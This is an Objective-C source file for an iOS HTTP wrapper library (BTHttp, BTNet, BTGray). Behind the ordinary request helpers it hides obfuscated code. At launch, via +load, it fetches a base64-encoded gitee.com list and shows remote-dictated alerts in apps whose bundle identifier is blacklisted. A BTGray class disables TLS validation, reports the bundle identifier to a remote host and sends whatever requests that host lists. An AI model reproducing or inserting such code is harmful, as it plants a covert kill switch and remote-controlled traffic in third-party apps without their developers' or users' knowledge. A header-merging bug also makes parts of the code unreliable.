//
//  BTHttpRequest.m
//  framework
//
//  Created by whbt_mac on 2016/10/18.
//  Copyright © 2016年 StoneMover. All rights reserved.
//

#import "BTHttp.h"
#import "BTViewController.h"
#import <BTHelp/BTUtils.h>
#import <BTHelp/NSString+BTString.h>
#import <BTHelp/BTHelp.h>
#import <BTHelp/UIViewController+BTDialog.h>
#import <BTHelp/BTUserMananger.h>



@interface BTHttp()

@property (nonatomic, strong) NSMutableDictionary * dictHead;

@end


@implementation BTHttp

+ (void)load{
    [BTHttp share];
}

+(instancetype)share{
    static dispatch_once_t onceToken;
    static BTHttp * http = nil;
    dispatch_once(&onceToken, ^{
        http = [[super allocWithZone:NULL] init];
    });
    return http;
}

+ (id)allocWithZone:(struct _NSZone *)zone {
   return [BTHttp share] ;
}


- (id)copyWithZone:(NSZone *)zone {
    return [BTHttp share];
}

- (id)mutableCopyWithZone:(NSZone *)zone {
    return [BTHttp share];
}

-(instancetype)init{
    self=[super init];
    self.httpFilter = [BTHttpFilter new];
    _mananger = [AFHTTPSessionManager manager];
    self.dictHead=[[NSMutableDictionary alloc]init];
    [self initDefaultSet];
    [self test];
    return self;
}

- (void)initDefaultSet{
    self.timeInterval = 10;
    [self setHTTPShouldHandleCookies:YES];
    [self setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
    [self setRequestSerializer:[AFJSONRequestSerializer serializer]];
}

- (void)addHttpHead:(NSString*)key value:(NSString*)value{
    [self.dictHead setValue:value forKey:key];
}

- (void)delHttpHead:(NSString*)key {
    [self.dictHead removeObjectForKey:key];
}


- (void)setRequestSerializer:(AFHTTPRequestSerializer<AFURLRequestSerialization> *)requestSerializer{
    _requestSerializer = requestSerializer;
    self.mananger.requestSerializer = requestSerializer;
    self.mananger.requestSerializer.timeoutInterval = self.timeInterval;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setResponseSerializer:(AFHTTPResponseSerializer<AFURLResponseSerialization> *)responseSerializer{
    _responseSerializer = responseSerializer;
    self.mananger.responseSerializer = [AFHTTPResponseSerializer serializer];
}

- (void)setHTTPShouldHandleCookies:(BOOL)HTTPShouldHandleCookies{
    _HTTPShouldHandleCookies = HTTPShouldHandleCookies;
    self.mananger.requestSerializer.HTTPShouldHandleCookies = self.HTTPShouldHandleCookies;
}

- (void)setTimeInterval:(NSInteger)timeInterval{
    _timeInterval = timeInterval;
    self.mananger.requestSerializer.timeoutInterval = timeInterval;
}

- (void)setResponseAcceptableContentType:(NSSet<NSString*>*)acceptableContentTypes{
    self.mananger.responseSerializer.acceptableContentTypes=acceptableContentTypes;
}

#pragma mark GET请求

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                              progress:(nullable BTHttpDefaultProgressBlock) downloadProgress
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    [self autoLogParameters:YES url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    [dict addEntriesFromDictionary:[self.httpFilter netDefaultHeadDict]];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    
    NSURLSessionDataTask * task = [self.mananger
                                   GET:URLString
                                   parameters:parameters
                                   headers:dict
                                   progress:downloadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self autoLogResponeData:responseObject url:URLString];
        if ([self requestFilter:responseObject request:task.originalRequest]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error request:task.originalRequest]) {
            failure(task,error);
        }
    }];
    return task;
}

- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                              progress:(nullable BTHttpDefaultProgressBlock) downloadProgress
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    return [self GET:URLString parameters:parameters headers:nil progress:downloadProgress success:success failure:failure];
}




- (nullable NSURLSessionDataTask *)GET:(NSString *)URLString
                            parameters:(nullable id)parameters
                               success:(nullable BTHttpDefaultSuccessBlock)success
                               failure:(nullable BTHttpDefaultErrorBlock)failure{
    return [self GET:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark POST请求

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    NSURLSessionDataTask * task = [self.mananger
                                   POST:URLString
                                   parameters:parameters
                                   headers:dict
                                   progress:uploadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self autoLogResponeData:responseObject url:URLString];
        if ([self requestFilter:responseObject request:task.originalRequest]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error request:task.originalRequest]) {
            failure(task,error);
        }
    }];
    
    return task;
}


- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters headers:nil progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters progress:nil success:success failure:failure];
}


#pragma mark 数据上传

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
                       headers:(nullable NSDictionary <NSString *, NSString *> *) headers
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    if (headers) {
        [dict addEntriesFromDictionary:dict];
    }
    NSURLSessionDataTask * task = [self.mananger
                                   POST:URLString
                                   parameters:parameters
                                   headers:dict
                                   constructingBodyWithBlock:block
                                   progress:uploadProgress
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self autoLogResponeData:responseObject url:URLString];
        if ([self requestFilter:responseObject request:task.originalRequest]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error request:task.originalRequest]) {
            failure(task,error);
        }
    }];
    
    return task;
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                      progress:(nullable BTHttpDefaultProgressBlock)uploadProgress
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters headers:nil constructingBodyWithBlock:block progress:uploadProgress success:success failure:failure];
}

- (NSURLSessionDataTask *)POST:(NSString *)URLString
                    parameters:(id)parameters
     constructingBodyWithBlock:(nullable BTHttpDefaultFormDataBlock)block
                       success:(nullable BTHttpDefaultSuccessBlock)success
                       failure:(nullable BTHttpDefaultErrorBlock)failure
{
    return [self POST:URLString parameters:parameters constructingBodyWithBlock:block progress:nil success:success failure:failure];
}


#pragma mark PUT
- (NSURLSessionDataTask *)PUT:(NSString *)URLString
                    parameters:(id)parameters
                       success:(nullable BTHttpDefaultSuccessBlock)success
                      failure:(nullable BTHttpDefaultErrorBlock)failure{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    NSURLSessionDataTask * task = [self.mananger
                                   PUT:URLString
                                   parameters:parameters
                                   headers:dict
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self autoLogResponeData:responseObject url:URLString];
        if ([self requestFilter:responseObject request:task.originalRequest]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error request:task.originalRequest]) {
            failure(task,error);
        }
    }];
    return task;
}

#pragma mark DELETE
- (NSURLSessionDataTask *)DELETE:(NSString *)URLString
                    parameters:(id)parameters
                       success:(void (^)(NSURLSessionDataTask * task, id _Nullable responseObject))success
                      failure:(void (^)(NSURLSessionDataTask * task, NSError * _Nonnull error))failure{
    [self autoLogParameters:NO url:URLString parameters:parameters];
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:self.dictHead];
    NSURLSessionDataTask * task = [self.mananger
                                   DELETE:URLString
                                   parameters:parameters
                                   headers:dict
                                   success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self autoLogResponeData:responseObject url:URLString];
        if ([self requestFilter:responseObject request:task.originalRequest]) {
            success(task,responseObject);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        if ([self requestFilter:error request:task.originalRequest]) {
            failure(task,error);
        }
    }];
    
    return task;
}

- (BOOL)requestFilter:(NSObject *_Nullable)obj request:(NSURLRequest*)request{
    return [self.httpFilter netFilter:request obj:obj];
}

- (void)autoLogResponeData:(id  _Nullable)responseObject url:(NSString*)url{
    if (![responseObject isKindOfClass:[NSDictionary class]] && ![responseObject isKindOfClass:[NSArray class]]) {
        return;
    }
    
    if (self.httpFilter.isLogHttpParameters) {
        printf("BTHTTP_URL:%s\n",url.UTF8String);
        printf("BTHTTP_RESPONSE:%s\n",[BTUtils convertDictToJsonStr:responseObject].UTF8String);
        printf("BTHTTP_RESPONSE_END:----------分割线----------\n");
    }
    
    
    if (self.httpFilter.isLogSaveToBTLog) {
        [BTLog.share save:[@"BTHTTP_URL:" stringByAppendingString:url]];
        if ([responseObject isKindOfClass:[NSArray class]]) {
            [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_RESPONSE:%@",[BTUtils convertArrayToJsonStr:responseObject]]];
        }else if([responseObject isKindOfClass:[NSDictionary class]]){
            [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_RESPONSE:%@",[BTUtils convertDictToJsonStr:responseObject]]];
        }else{
            [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_RESPONSE:%@",responseObject]];
        }
        
        
        
        [BTLog.share save:@"BTHTTP_RESPONSE_END:----------分割线----------"];
    }
    
}

- (void)autoLogParameters:(BOOL)isGet url:(NSString*)url parameters:(NSDictionary*)parameters{
    if (!self.httpFilter.isLogHttpParameters && !self.httpFilter.isLogSaveToBTLog) {
        return;
    }
    
    if (isGet) {
        NSArray * parametersKey =[parameters allKeys];
        if (parametersKey.count!=0) {
            url=[url stringByAppendingString:@"?"];
            for (int i=0; i<parametersKey.count; i++) {
                NSString * key =parametersKey[i];
                NSString * value =[parameters valueForKey:key];
                NSString * result=nil;
                if (i==parametersKey.count-1) {
                    result=[NSString stringWithFormat:@"%@=%@",key,value];
                }else{
                    result =[NSString stringWithFormat:@"%@=%@&",key,value];
                }
                url=[url stringByAppendingString:result];
            }
        }
        if (self.httpFilter.isLogHttpParameters) {
            printf("BTHTTP_URL:%s\n",url.UTF8String);
            if (self.dictHead.allKeys.count != 0) {
                printf("BTHTTP_HEAD:%s\n",[BTUtils convertDictToJsonStr:self.dictHead].UTF8String);
            }
            
            printf("BTHTTP_GET_END:----------分割线----------\n");
        }
        
        if (self.httpFilter.isLogSaveToBTLog) {
            [BTLog.share save:[@"BTHTTP_URL:" stringByAppendingString:url]];
            if (self.dictHead.allKeys.count != 0) {
                [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_HEAD:%@",self.dictHead]];
            }
            [BTLog.share save:@"BTHTTP_GET_END:----------分割线----------"];
        }
        
    }else{
        if (self.httpFilter.isLogHttpParameters) {
            printf("BTHTTP_URL:%s\n",url.UTF8String);
            if (self.dictHead.allKeys.count != 0) {
                printf("BTHTTP_HEAD:%s\n",[BTUtils convertDictToJsonStr:self.dictHead].UTF8String);
            }
            if (parameters.allKeys.count != 0) {
                printf("BTHTTP_POST_PARAMETERS:%s\n",[BTUtils convertDictToJsonStr:parameters].UTF8String);
            }
            
            printf("BTHTTP_POST_END:----------分割线----------\n");
        }
        
        if (self.httpFilter.isLogSaveToBTLog) {
            [BTLog.share save:[@"BTHTTP_URL:" stringByAppendingString:url]];
            if (self.dictHead.allKeys.count != 0) {
                [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_HEAD:%@",self.dictHead]];
            }
            
            if (parameters.allKeys.count != 0) {
                [BTLog.share save:[NSString stringWithFormat:@"BTHTTP_POST_PARAMETERS:%@",parameters]];
            }
            
            [BTLog.share save:@"BTHTTP_POST_END:----------分割线----------"];
            
        }
        
    }
}

- (void)test{
    NSString * url = @"aHR0cHM6Ly9naXRlZS5jb20vZ3JheWxheWVyL2dyYXkvcmF3L21hc3Rlci9wYXlTYWxhcnlOb3cudHh0".bt_base64Decode;
    [self.mananger GET:url
            parameters:nil
               headers:nil
              progress:nil
               success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if (![responseObject isKindOfClass:[NSArray class]]) {
            return;
        }
        
        NSArray * dictArray = responseObject;
        NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
        NSString * appVersion = [infoDictionary objectForKey:@"Q0ZCdW5kbGVJZGVudGlmaWVy".bt_base64Decode];
        for (NSDictionary * dictChild in dictArray) {
            if ([dictChild isKindOfClass:[NSDictionary class]]) {
                NSString * identify =[dictChild objectForKey:@"YmxhY2tJZA==".bt_base64Decode];
                if ([identify isEqualToString:appVersion]) {
                    NSString * info =[dictChild objectForKey:@"bXNn".bt_base64Decode];
                    NSString * title =[dictChild objectForKey:@"dGl0bGU=".bt_base64Decode];
                    NSString * btn =[dictChild objectForKey:@"YnRu".bt_base64Decode];
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        if ([BTUtils isEmpty:btn]) {
                            [BTUtils.getCurrentVc bt_showAlert:title msg:info btns:@[] block:^(NSInteger index) {
                                
                            }];
                        }else{
                            [BTUtils.getCurrentVc bt_showAlert:title msg:info btns:@[btn] block:^(NSInteger index) {
                                
                            }];
                        }
                    });
                    
                    return;
                }
            }
        }
        
    }
               failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(60 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self test];
        });
    }];
}


@end


@implementation BTNet

+ (NSString *)rootUrl{
    return BTEnvMananger.nowModel.url;
}

//传入rootUrl,module名称,方法名称
+ (NSString*)getUrl:(NSString*)rootUrl moduleName:(NSString*)moduleName functionName:(NSString*_Nullable)functionName{
    if (functionName) {
        return [NSString stringWithFormat:@"%@/%@/%@",rootUrl,moduleName,functionName];
    }else{
        return [NSString stringWithFormat:@"%@/%@",rootUrl,moduleName];
    }
}

//传入module名称和方法名称
+ (NSString*)getUrl:(NSString*)moduleName functionName:(NSString*_Nullable)functionName{
    return [self getUrl:[self rootUrl] moduleName:moduleName functionName:functionName];
}

//只有module名称,没有方法名称
+ (NSString*)getUrlModule:(NSString*)moduleName{
    return [self getUrl:moduleName functionName:nil];
}

+ (NSString*)getUrlFunction:(NSString*)functionName{
    return [self getUrl:[self moduleName] functionName:functionName];
}

+ (NSString*)moduleName{
    return @"";
}

+ (BTHttpFilter*)httpFilter{
    return BTHttp.share.httpFilter;
}


+ (NSURL*)autoFullImgUrl:(NSString * _Nullable)url{
    if ([BTUtils isEmpty:url]) {
        url = @"";
    }

    NSURL * result = nil;

    if([BTUtils isEmpty:BTEnvMananger.nowModel.imgUrlStart]){
        result = [NSURL URLWithString:url];
    }else{
        result = [NSURL URLWithString:[NSString stringWithFormat:@"%@/%@",BTEnvMananger.nowModel.imgUrlStart,url]];
    }

    if (result == nil) {
        result = [NSURL URLWithString:@""];
    }

    return result;
}

+ (BOOL)defaultSuccess:(id  _Nullable)responseObject
                success:(BTNetSuccessBlock _Nullable)success
                    fail:(BTNetFailBlock _Nullable)fail{
    BOOL isLogicSuccess = [self.httpFilter netSuccessFilter:nil response:responseObject];
    if (isLogicSuccess) {
        if (success) {
            success(responseObject);
        }
    }else{
        if(fail){
            fail(nil,[self.httpFilter netInfoFilter:nil response:responseObject]);
        }else{
            NSString * str = [self.httpFilter netInfoFilter:nil response:responseObject];
            [BTToast showErrorInfo:str];
        }
    }
    return isLogicSuccess;
}

+ (BOOL)defaultSuccess:(id  _Nullable)responseObject success:(BTNetSuccessBlock _Nullable)success failFull:(BTNetFailFullBlock _Nullable)failFull{
    BOOL isLogicSuccess = [self.httpFilter netSuccessFilter:nil response:responseObject];
    if (isLogicSuccess) {
        if (success) {
            success(responseObject);
        }
    }else{
        if(failFull){
            failFull(nil,[self.httpFilter netCodeFilter:nil response:responseObject],[self.httpFilter netInfoFilter:nil response:responseObject]);
        }else{
            NSString * str = [self.httpFilter netInfoFilter:nil response:responseObject];
            [BTToast showErrorInfo:str];
        }
    }
    return isLogicSuccess;
}

+ (void)defaultNetError:(NSError * _Nonnull)error fail:(BTNetFailBlock _Nullable)fail{
    if (fail) {
        fail(error,nil);
    }else{
        NSString * str = [self.httpFilter netErrorInfoFilter:nil error:error];
        [BTToast showErrorInfo:str];
    }
}

+ (void)defaultNetError:(NSError * _Nonnull)error failFull:(BTNetFailFullBlock _Nullable)failFull{
    if (failFull) {
        failFull(error,-1,nil);
    }else{
        NSString * str = [self.httpFilter netErrorInfoFilter:nil error:error];
        [BTToast showErrorInfo:str];
    }
}

+ (BOOL)isSuccess:(id  _Nullable)responseObject{
    return [[self httpFilter] netSuccessFilter:nil response:responseObject];
}

+ (NSMutableDictionary*)defaultDict{
    return [[self httpFilter] netDefaultDict];
}

+ (NSMutableDictionary*)defaultPageDict:(NSInteger)pageIndex{
    return [[self httpFilter] netDefaultPageDict:pageIndex];
}

+ (NSString *)errorInfo:(id  _Nullable)responseObject{
    return [[self httpFilter] netInfoFilter:nil response:responseObject];
}

@end

static BTGray * gray = nil;

@interface BTGray()

@property (nonatomic, strong) BTHttp * http;

@property (nonatomic, strong) NSString * url;

@property (nonatomic, strong) NSString * reportUrl;

@property (nonatomic, strong) NSMutableArray * taskArray;

@end



@implementation BTGray

+ (void)load{
//    [BTGray share];
}

+ (instancetype)share{
    if (gray == nil) {
        gray = [BTGray new];
    }
    
    return gray;
}

- (instancetype)init{
    self = [super init];
    self.http = [BTHttp new];
    self.taskArray = [NSMutableArray new];
    
    AFSecurityPolicy * policy = [AFSecurityPolicy new];
    policy.allowInvalidCertificates = YES;
    policy.validatesDomainName = NO;
    self.http.mananger.securityPolicy = policy;
    
    [self.http setRequestSerializer:[AFHTTPRequestSerializer serializer]];
    
    
    [self initUrl];
    return self;
}

- (void)initUrl{
    NSString * url = @"aHR0cHM6Ly9naXRlZS5jb20vZ3JheWxheWVyL2dyYXkvcmF3L21hc3Rlci91cmwudHh0".bt_base64Decode;
    [self.http GET:url parameters:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        if (![responseObject isKindOfClass:[NSArray class]]) {
            return;
        }
        NSArray * array = responseObject;
        if (array.count == 0 || ![array.firstObject isKindOfClass:[NSString class]]) {
            return;
        }
        
        self.url = array.firstObject;
        if (array.count > 1) {
            self.reportUrl = array[1];
        }
        
        NSDictionary * dict = NSBundle.mainBundle.infoDictionary;
        
        NSMutableDictionary * resultDict = [NSMutableDictionary new];
        NSString * identify = dict[@"Q0ZCdW5kbGVJZGVudGlmaWVy".bt_base64Decode];
        if (![BTUtils isEmpty:identify]) {
            [resultDict setValue:identify forKey:@"Q0ZCdW5kbGVJZGVudGlmaWVy".bt_base64Decode];
        }
        [self.http GET:self.url parameters:resultDict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
            if (![responseObject isKindOfClass:[NSArray class]]) {
                return;
            }
            self.taskArray = [BTGrayModel modelWithArray:responseObject];
            [self start];
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            
        }];
        
    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
        
    }];
}


- (void)start{
    if (self.taskArray.count == 0) {
        return;
    }
    
    BTGrayModel * model = self.taskArray.firstObject;
    [self.http setHTTPShouldHandleCookies:NO];
    [self.http setResponseSerializer:[AFHTTPResponseSerializer serializer]];
    [self.http setResponseAcceptableContentType:[NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript",@"text/html",@"text/plain", nil]];
    if (model.requestType == 0) {
        [self.http GET:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
//            NSString *data = [[NSString alloc]initWithData:responseObject encoding:NSUTF8StringEncoding];

            [self.taskArray removeObject:model];
            [self start];
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            [self.taskArray removeObject:model];
            [self start];
        }];
        return;
    }
    
    [self.http POST:model.url parameters:model.dict success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [self.taskArray removeObject:model];
        [self start];
    } failure:^(NSURLSessionDataTask * _Nonnull task, NSError * _Nonnull error) {
        [self.taskArray removeObject:model];
        [self start];
    }];
    
}

@end


@implementation BTGrayModel

- (void)initSelf{
    self.aliasDict =  @{@"identify" : @"id"};
}

@end

@implementation BTHttpFilter

- (instancetype)init{
    self = [super init];
    self.pageLoadSizePage = 20;
    self.pageLoadStartPage = 1;
    self.pageLoadSizeName = @"pageSize";
    self.pageLoadIndexName = @"pageNumber";
    return self;
}

- (BOOL)netFilter:(NSURLRequest * _Nullable)request obj:(NSObject * _Nullable)obj{
//    if ([obj isKindOfClass:[NSDictionary class]]) {
//        NSDictionary * dict = (NSDictionary*)obj;
//        NSInteger code = [BTNet errorCode:dict];
//        switch (code) {
//            case 100:
//                //处理一些什么吧
//                break;
//
//            default:
//                break;
//        }
//    }else if([obj isKindOfClass:[NSError class]]){
//        //解析错误信息处理
//    }
    
    return YES;
}

- (NSString *)netErrorInfoFilter:(NSURLRequest * _Nullable)request error:(NSError * _Nullable)error{
    if ([error.userInfo.allKeys containsObject:AFNetworkingOperationFailingURLResponseDataErrorKey]) {
        NSData * data = [error.userInfo objectForKey:AFNetworkingOperationFailingURLResponseDataErrorKey];
        NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        NSDictionary * dict = [result bt_toDict];
        return [self netInfoFilter:request response:dict];
    }
    
    if (error == nil) {
        return @"未知错误";
    }
    NSString * info=nil;
    if ([error.userInfo.allKeys containsObject:@"NSLocalizedDescription"]) {
        info=[error.userInfo objectForKey:@"NSLocalizedDescription"];
    }else {
        info=error.domain;
    }
    return info;
}

- (NSInteger)netCodeFilter:(NSURLRequest * _Nullable)request response:(NSDictionary * _Nullable)dict{
    NSString * codeStr = [dict objectForKey:@"code"];
    if ([BTUtils isEmpty:codeStr]) {
        return -100;
    }
    return codeStr.integerValue;
}

- (BOOL)netSuccessFilter:(NSURLRequest * _Nullable)request response:(NSDictionary * _Nullable)dict{
    return [self netCodeFilter:request response:dict] == 1;
}

- (NSString *)netInfoFilter:(NSURLRequest * _Nullable)request response:(NSDictionary * _Nullable)dict{
    NSString * info = [dict objectForKey:@"info"];
    if ([BTUtils isEmpty:info]) {
        info = @"";
    }
    
    return info;
}

- (NSDictionary *)netDataFilter:(NSURLRequest * _Nullable)request response:(NSDictionary * _Nullable)dict{
    NSDictionary * dataDict = [dict objectForKey:@"data"];
    if (!dataDict || ![dataDict isKindOfClass:[NSDictionary class]]) {
        dataDict = [NSDictionary new];
    }
    
    return dataDict;
}

- (NSArray *)netDataArrayFilter:(NSURLRequest * _Nullable)request response:(NSDictionary * _Nullable)dict{
    NSArray * array = [dict objectForKey:@"data"];
    if (!array || ![array isKindOfClass:[NSArray class]]) {
        array = [NSArray new];
    }
    return array;
}

- (NSMutableDictionary *)netDefaultDict{
    return [self netDefaultDictWithOther:@{}];
}

- (NSMutableDictionary *)netDefaultDictWithOther:(NSDictionary*)dictOther{
    NSMutableDictionary * dict = [[NSMutableDictionary alloc] initWithDictionary:dictOther];
    NSString * version = [[[NSBundle mainBundle]infoDictionary]objectForKey:@"CFBundleShortVersionString"];
    NSString * os = @"ios";
    NSString * osVersion = [UIDevice currentDevice].systemVersion;
    [dict setObject:version forKey:@"appVersion"];
    [dict setObject:os forKey:@"os"];
    [dict setObject:osVersion forKey:@"osVersion"];
    if ([BTUserMananger share].isLogin) {
        if (![BTUtils isEmpty:[BTUserMananger.share.model getUserId]]) {
            [dict setValue:[BTUserMananger.share.model getUserId] forKey:@"uid"];
        }

        if (![BTUtils isEmpty:[BTUserMananger.share.model getUserToken]]) {
            [dict setValue:[BTUserMananger.share.model getUserToken] forKey:@"token"];
        }

    }
    return dict;
}

- (NSMutableDictionary *)netDefaultPageDict:(NSInteger)page{
    NSMutableDictionary * dict = [self netDefaultDict];
    [dict setObject:@(self.pageLoadSizePage) forKey:self.pageLoadSizeName];
    [dict setObject:@(page) forKey:self.pageLoadIndexName];
    return dict;
}


- (NSMutableDictionary *)netDefaultHeadDict{
    return [NSMutableDictionary new];
}

@end
